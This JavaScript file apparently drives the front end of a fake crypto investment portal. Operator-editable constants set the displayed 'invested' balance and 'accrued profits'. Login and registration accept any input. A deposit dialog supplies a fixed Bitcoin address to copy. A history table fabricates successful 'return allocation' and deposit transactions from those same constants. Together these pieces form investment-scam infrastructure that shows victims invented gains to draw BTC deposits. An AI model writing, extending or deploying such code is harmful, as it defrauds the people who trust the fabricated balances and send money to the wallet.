// ==========================================
// MASTER DUAL-BALANCE CONFIGURATION ENGINE
// Edit these below to change values instantly
// ==========================================
const PORTAL_CONFIG = {
    INVESTMENT_BALANCE: "0.00",
    ACCRUED_PROFITS: "0.00",
    WALLET_ADDRESS: "bc1q2gghcd7dxu0m5clpz4rscyz60naa7jal3prq7z"
};

document.addEventListener("DOMContentLoaded", () => {
    // View Router
    function showView(viewId) {
        document.querySelectorAll('.app-view').forEach(view => view.classList.remove('active-view'));
        const targetView = document.getElementById(viewId);
        if (targetView) targetView.classList.add('active-view');
        window.scrollTo(0, 0);
    }

    // Load Configured Balances into UI
    const displayInvested = document.getElementById('display-invested');
    const displayProfits = document.getElementById('display-profits');
    if (displayInvested) displayInvested.innerText = "$" + PORTAL_CONFIG.INVESTMENT_BALANCE;
    if (displayProfits) displayProfits.innerText = "$" + PORTAL_CONFIG.ACCRUED_PROFITS;

    // Navigation Click Events
    const navLogo = document.getElementById('nav-logo');
    const navLoginBtn = document.getElementById('nav-login-btn');
    const openAccountBtn = document.getElementById('open-account-btn');
    const viewMarketBtn = document.getElementById('view-market-btn');
    const btnLogout = document.getElementById('btn-logout');

    if (navLogo) navLogo.addEventListener('click', () => showView('view-home'));
    if (navLoginBtn) navLoginBtn.addEventListener('click', () => showView('view-login'));
    if (openAccountBtn) openAccountBtn.addEventListener('click', () => showView('view-register'));
    if (viewMarketBtn) viewMarketBtn.addEventListener('click', () => showView('view-market'));
    if (btnLogout) btnLogout.addEventListener('click', () => showView('view-home'));
    
    document.querySelectorAll('.switch-to-login').forEach(el => el.addEventListener('click', () => showView('view-login')));
    document.querySelectorAll('.switch-to-register').forEach(el => el.addEventListener('click', () => showView('view-register')));
    document.querySelectorAll('.back-to-home-btn').forEach(el => el.addEventListener('click', () => showView('view-home')));

    // Auth Forms
    const registerForm = document.getElementById('register-form');
    if (registerForm) {
        registerForm.addEventListener('submit', (e) => {
            e.preventDefault();
            const regName = document.getElementById('reg-name');
            const userDisplayName = document.getElementById('user-display-name');
            if (userDisplayName && regName) userDisplayName.innerText = regName.value;
            showView('view-portal');
        });
    }

    const loginForm = document.getElementById('login-form');
    if (loginForm) {
        loginForm.addEventListener('submit', (e) => {
            e.preventDefault();
            const userDisplayName = document.getElementById('user-display-name');
            if (userDisplayName) userDisplayName.innerText = "Authorized Node";
            showView('view-portal');
        });
    }

    // Modals Control
    const modalDeposit = document.getElementById('modal-deposit');
    const modalHistory = document.getElementById('modal-history');

    const actionDeposit = document.getElementById('action-deposit');
    if (actionDeposit) {
        actionDeposit.addEventListener('click', () => {
            const btcField = document.getElementById('btc-address-field');
            if (btcField) btcField.value = PORTAL_CONFIG.WALLET_ADDRESS;
            if (modalDeposit) modalDeposit.classList.remove('hidden-modal');
        });
    }

    const actionHistory = document.getElementById('action-history');
    if (actionHistory) {
        actionHistory.addEventListener('click', () => {
            renderHistoryTable();
            if (modalHistory) modalHistory.classList.remove('hidden-modal');
        });
    }

    document.querySelectorAll('.close-modal-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            if (modalDeposit) modalDeposit.classList.add('hidden-modal');
            if (modalHistory) modalHistory.classList.add('hidden-modal');
        });
    });

    // Copy Button Mechanism
    const btnCopyBtc = document.getElementById('btn-copy-btc');
    if (btnCopyBtc) {
        btnCopyBtc.addEventListener('click', () => {
            const addrField = document.getElementById('btc-address-field');
            if (addrField) {
                addrField.select();
                navigator.clipboard.writeText(addrField.value);
            }
            const msg = document.getElementById('copy-status-message');
            if (msg) {
                msg.innerText = "BTC Address Copied to Clipboard!";
                setTimeout(() => msg.innerText = "", 3000);
            }
        });
    }

    // Dynamic History Table Generation
    function renderHistoryTable() {
        const historyRows = document.getElementById('transaction-history-rows');
        if (historyRows) {
            historyRows.innerHTML = `
                <tr>
                    <td>#TRX-9942</td>
                    <td>Automated Return Allocation</td>
                    <td style="color: #34c759; font-weight:600;">+$${PORTAL_CONFIG.ACCRUED_PROFITS}</td>
                    <td style="color: #34c759;">Success</td>
                </tr>
                <tr>
                    <td>#TRX-8810</td>
                    <td>Initial Account Capital Deposit</td>
                    <td style="color: #fff; font-weight:600;">$${PORTAL_CONFIG.INVESTMENT_BALANCE}</td>
                    <td style="color: #34c759;">Success</td>
                </tr>
            `;
        }
    }
});
